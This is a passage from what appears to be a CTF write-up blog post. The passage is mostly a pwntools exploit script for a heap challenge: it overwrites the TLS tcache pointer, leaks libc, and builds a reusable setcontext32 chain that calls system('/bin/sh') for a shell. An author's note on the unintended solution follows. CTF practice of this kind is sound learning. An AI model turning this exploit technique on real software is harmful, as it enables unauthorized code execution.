payload <span style="color:#ff6ac1">+=</span> p64(leak<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">0x30</span>) <span style="color:#78787e"># 0x70 bin</span>
send_echo(payload, <span style="color:#ff9f43">0x80</span>) <span style="color:#78787e"># new tcache perthread struct</span>

send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a</span><span style="color:#5af78e">\0</span><span style="color:#5af78e">a&#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a&#34;</span><span style="color:#ff6ac1">*</span>(<span style="color:#ff9f43">0x10000</span><span style="color:#ff6ac1">-</span><span style="color:#ff9f43">3</span>)<span style="color:#ff6ac1">+</span><span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;b&#34;</span><span style="color:#ff6ac1">*</span>(<span style="color:#ff9f43">136920</span>) <span style="color:#ff6ac1">+</span> p64(leak<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">0x10</span>), <span style="color:#ff9f43">0x30001</span>) <span style="color:#78787e"># overwrite tls pointer to tcache_perthread_struct</span>

send_echo(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;&#34;</span>, <span style="color:#ff9f43">0x10</span>) <span style="color:#78787e"># allocate over libc address</span>
conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;:[&#34;</span>)
libcleak <span style="color:#ff6ac1">=</span> u64(conn<span style="color:#ff6ac1">.</span>recv(<span style="color:#ff9f43">6</span>) <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\0\0</span><span style="color:#5af78e">&#34;</span>)
libc<span style="color:#ff6ac1">.</span>address <span style="color:#ff6ac1">=</span> libcleak <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">0x21a280</span> <span style="color:#ff6ac1">-</span> <span style="color:#ff9f43">0x60</span>
info(<span style="color:#5af78e">&#34;libc @ &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">hex</span>(libc<span style="color:#ff6ac1">.</span>address))

<span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">create_ucontext</span>(
    src: <span style="color:#ff5c57">int</span>,
    rsp<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    rbx<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    rbp<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    r12<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    r13<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    r14<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    r15<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    rsi<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    rdi<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    rcx<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    r8<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    r9<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    rdx<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0</span>,
    rip<span style="color:#ff6ac1">=</span><span style="color:#ff9f43">0xDEADBEEF</span>,
) <span style="color:#ff6ac1">-&gt;</span> <span style="color:#ff5c57">bytearray</span>:
    b <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">bytearray</span>(<span style="color:#ff9f43">0x200</span>)
    b[<span style="color:#ff9f43">0xE0</span>:<span style="color:#ff9f43">0xE8</span>] <span style="color:#ff6ac1">=</span> p64(src)  <span style="color:#78787e"># fldenv ptr</span>
    b[<span style="color:#ff9f43">0x1C0</span>:<span style="color:#ff9f43">0x1C8</span>] <span style="color:#ff6ac1">=</span> p64(<span style="color:#ff9f43">0x1F80</span>)  <span style="color:#78787e"># ldmxcsr</span>

    b[<span style="color:#ff9f43">0xA0</span>:<span style="color:#ff9f43">0xA8</span>] <span style="color:#ff6ac1">=</span> p64(rsp)
    b[<span style="color:#ff9f43">0x80</span>:<span style="color:#ff9f43">0x88</span>] <span style="color:#ff6ac1">=</span> p64(rbx)
    b[<span style="color:#ff9f43">0x78</span>:<span style="color:#ff9f43">0x80</span>] <span style="color:#ff6ac1">=</span> p64(rbp)
    b[<span style="color:#ff9f43">0x48</span>:<span style="color:#ff9f43">0x50</span>] <span style="color:#ff6ac1">=</span> p64(r12)
    b[<span style="color:#ff9f43">0x50</span>:<span style="color:#ff9f43">0x58</span>] <span style="color:#ff6ac1">=</span> p64(r13)
    b[<span style="color:#ff9f43">0x58</span>:<span style="color:#ff9f43">0x60</span>] <span style="color:#ff6ac1">=</span> p64(r14)
    b[<span style="color:#ff9f43">0x60</span>:<span style="color:#ff9f43">0x68</span>] <span style="color:#ff6ac1">=</span> p64(r15)

    b[<span style="color:#ff9f43">0xA8</span>:<span style="color:#ff9f43">0xB0</span>] <span style="color:#ff6ac1">=</span> p64(rip)  <span style="color:#78787e"># ret ptr</span>
    b[<span style="color:#ff9f43">0x70</span>:<span style="color:#ff9f43">0x78</span>] <span style="color:#ff6ac1">=</span> p64(rsi)
    b[<span style="color:#ff9f43">0x68</span>:<span style="color:#ff9f43">0x70</span>] <span style="color:#ff6ac1">=</span> p64(rdi)
    b[<span style="color:#ff9f43">0x98</span>:<span style="color:#ff9f43">0xA0</span>] <span style="color:#ff6ac1">=</span> p64(rcx)
    b[<span style="color:#ff9f43">0x28</span>:<span style="color:#ff9f43">0x30</span>] <span style="color:#ff6ac1">=</span> p64(r8)
    b[<span style="color:#ff9f43">0x30</span>:<span style="color:#ff9f43">0x38</span>] <span style="color:#ff6ac1">=</span> p64(r9)
    b[<span style="color:#ff9f43">0x88</span>:<span style="color:#ff9f43">0x90</span>] <span style="color:#ff6ac1">=</span> p64(rdx)

    <span style="color:#ff6ac1">return</span> b

<span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">setcontext32</span>(libc: ELF, <span style="color:#ff6ac1">**</span>kwargs) <span style="color:#ff6ac1">-&gt;</span> (<span style="color:#ff5c57">int</span>, <span style="color:#ff5c57">bytes</span>):
    got <span style="color:#ff6ac1">=</span> libc<span style="color:#ff6ac1">.</span>address <span style="color:#ff6ac1">+</span> libc<span style="color:#ff6ac1">.</span>dynamic_value_by_tag(<span style="color:#5af78e">&#34;DT_PLTGOT&#34;</span>)
    plt_trampoline <span style="color:#ff6ac1">=</span> libc<span style="color:#ff6ac1">.</span>address <span style="color:#ff6ac1">+</span> libc<span style="color:#ff6ac1">.</span>get_section_by_name(<span style="color:#5af78e">&#34;.plt&#34;</span>)<span style="color:#ff6ac1">.</span>header<span style="color:#ff6ac1">.</span>sh_addr
    <span style="color:#ff6ac1">return</span> got, flat(
        p64(<span style="color:#ff9f43">0</span>),
        p64(got <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">0x218</span>),
        p64(libc<span style="color:#ff6ac1">.</span>symbols[<span style="color:#5af78e">&#34;setcontext&#34;</span>] <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">32</span>),
        p64(plt_trampoline) <span style="color:#ff6ac1">*</span> <span style="color:#ff9f43">0x40</span>,
        create_ucontext(got <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">0x218</span>, rsp<span style="color:#ff6ac1">=</span>libc<span style="color:#ff6ac1">.</span>symbols[<span style="color:#5af78e">&#34;environ&#34;</span>] <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">8</span>, <span style="color:#ff6ac1">**</span>kwargs),
    )

dest, pl <span style="color:#ff6ac1">=</span> setcontext32(
             libc, rip<span style="color:#ff6ac1">=</span>libc<span style="color:#ff6ac1">.</span>sym[<span style="color:#5af78e">&#34;system&#34;</span>], rdi<span style="color:#ff6ac1">=</span>libc<span style="color:#ff6ac1">.</span>search(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;/bin/sh&#34;</span>)<span style="color:#ff6ac1">.</span>__next__()
           )

<span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">send_raw</span>(content, sz, end<span style="color:#ff6ac1">=</span><span style="color:#ff6ac1">True</span>) :
    sock<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;PKT_RES&#34;</span>)
    sock<span style="color:#ff6ac1">.</span>send(p64(sz))
    payload <span style="color:#ff6ac1">=</span> content
    sock<span style="color:#ff6ac1">.</span>sendline(payload)

payload <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;a&#34;</span><span style="color:#ff6ac1">*</span>(<span style="color:#ff9f43">8</span><span style="color:#ff6ac1">*</span><span style="color:#ff9f43">6</span>)
payload <span style="color:#ff6ac1">+=</span> p64(dest)
payload <span style="color:#ff6ac1">+=</span> p64(<span style="color:#ff9f43">0</span>)
payload <span style="color:#ff6ac1">+=</span> p64(<span style="color:#ff9f43">0</span>)
payload <span style="color:#ff6ac1">+=</span> p64(<span style="color:#ff9f43">0</span>)
payload <span style="color:#ff6ac1">+=</span> p64(<span style="color:#ff9f43">0</span>)
send_echo(payload, <span style="color:#ff9f43">0x50</span>) <span style="color:#78787e"># new tcache_perthread_struct</span>

send_raw(pl[<span style="color:#ff9f43">8</span>:], <span style="color:#ff9f43">0</span>)

conn<span style="color:#ff6ac1">.</span>interactive()
</code></pre></div><p>afternote: this solution was a bit unintended, I found out later; the intended solution does not use the house of orange to get a leak. Instead, it uses partial overwrites to control tcache before getting a leak. This made the challenge a bit easier than it was supposed to be.</p>

        </div>

    </article>

</div>


            <footer class="footer">    
</footer>

        </div>
    </body>

    

</html>